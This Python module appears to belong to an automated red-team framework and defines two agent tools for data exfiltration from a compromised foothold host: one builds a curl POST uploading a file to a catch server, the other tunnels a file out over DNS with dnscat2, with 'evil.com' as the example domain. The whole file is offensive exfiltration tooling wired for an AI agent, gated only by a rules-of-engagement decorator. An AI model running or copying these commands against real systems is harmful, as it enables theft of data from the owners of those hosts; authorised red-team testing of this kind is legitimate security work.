"""AutoRed Phase 4 — Data-exfiltration tool wrappers.

Two exfiltration tools, each decorated with
``@tool @roe_guard(allowed_categories=["exfil"])``:

    * ``exfil_https`` — POST a file to a catch server via ``curl``.
    * ``exfil_dns``   — tunnel a file out via ``dnscat2``.

Each tool builds the command and returns an :class:`ExfilResult`
with the catch-server coordinates and the path where the catch
server is expected to log the incoming transfer (so the Phase 5
report can point operators at the evidence). Actual execution is
deferred to the Phase 6 foothold session manager.
"""
from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.roe_guard import roe_guard

log = get_logger("tools.exfil")


# Default path on the AutoRed operator host where the catch server
# writes per-source transfer logs. The ExfilAgent (Phase 4 Task 10)
# and the report generator (Phase 5) read these to confirm
# successful exfiltration.
_CATCH_LOG_DIR = "/var/log/autored/catch"


class ExfilResult(BaseModel):
    """Result of an exfiltration tool invocation.

    ``catch_server`` and ``catch_server_log_path`` together identify
    where the exfiltrated data should land — operators use the log
    path to confirm a transfer was received. ``data_size_bytes`` is
    populated once the foothold session manager (Phase 6) reports a
    successful transfer; until then it stays 0.
    """

    method: str
    source_host: str
    data_size_bytes: int = 0
    catch_server: str = ""
    catch_server_log_path: str = ""


# --------------------------------------------------------------------------- #
# Command builders — each returns a list[str] of argv tokens.
# --------------------------------------------------------------------------- #
def _build_exfil_https(catch_server: str, file_path: str) -> list[str]:
    """Build the HTTPS exfil command (curl POST multipart upload).

    Sends ``file_path`` as a multipart form upload named ``file`` to
    ``http://<catch_server>/upload``. The catch server is expected
    to write the received file under ``_CATCH_LOG_DIR`` and append a
    per-source line to ``<source_host>.log``.
    """
    return [
        "curl",
        "-sS",
        "-X", "POST",
        "-F", f"file=@{file_path}",
        f"http://{catch_server}/upload",
    ]


def _build_exfil_dns(domain: str, file_path: str) -> list[str]:
    """Build the DNS-tunnel exfil command (dnscat2).

    Uses ``dnscat2`` to tunnel ``file_path`` out via DNS queries to
    ``<domain>``. The dnscat2 catch server is expected to log the
    received chunks under ``_CATCH_LOG_DIR``.
    """
    return [
        "dnscat2",
        domain,
        "-f", file_path,
        "--exit-on-success",
    ]


# --------------------------------------------------------------------------- #
# Tools
# --------------------------------------------------------------------------- #
@tool
@roe_guard(allowed_categories=["exfil"])
async def exfil_https(
    catch_server: str,
    file_path: str,
    host_ip: str,
    engagement_id: str = "",
) -> ExfilResult:
    """Exfiltrate a file via HTTPS to a catch server.

    Builds a ``curl -X POST -F file=@<file_path>
    http://<catch_server>/upload`` command. The catch server is
    expected to log the transfer to
    ``/var/log/autored/catch/<source_host>.log``.

    Args:
        catch_server: Catch server hostname or IP (e.g.,
            "catch.example.com").
        file_path: Path to the file on the foothold to exfiltrate.
        host_ip: Source host IP (the foothold).
        engagement_id: Current engagement ID.

    Returns:
        ExfilResult with the catch-server coordinates and log path.
    """
    cmd = _build_exfil_https(catch_server, file_path)
    log.info(
        "exfil_https",
        host_ip=host_ip,
        catch_server=catch_server,
        file_path=file_path,
        command=" ".join(cmd),
    )
    return ExfilResult(
        method="https",
        source_host=host_ip,
        catch_server=catch_server,
        catch_server_log_path=f"{_CATCH_LOG_DIR}/{host_ip}.log",
    )


@tool
@roe_guard(allowed_categories=["exfil"])
async def exfil_dns(
    domain: str,
    file_path: str,
    host_ip: str,
    engagement_id: str = "",
) -> ExfilResult:
    """Exfiltrate a file via DNS tunneling (dnscat2).

    Builds a ``dnscat2 <domain> -f <file_path> --exit-on-success``
    command. The dnscat2 catch server (listening on the operator
    host for queries to ``<domain>``) is expected to log the
    received chunks to ``/var/log/autored/catch/<source_host>.log``.

    Args:
        domain: DNS tunnel domain (e.g., "evil.com").
        file_path: Path to the file on the foothold to exfiltrate.
        host_ip: Source host IP (the foothold).
        engagement_id: Current engagement ID.

    Returns:
        ExfilResult with the catch-server coordinates and log path.
    """
    cmd = _build_exfil_dns(domain, file_path)
    log.info(
        "exfil_dns",
        host_ip=host_ip,
        domain=domain,
        file_path=file_path,
        command=" ".join(cmd),
    )
    return ExfilResult(
        method="dns",
        source_host=host_ip,
        catch_server=domain,
        catch_server_log_path=f"{_CATCH_LOG_DIR}/{host_ip}.log",
    )
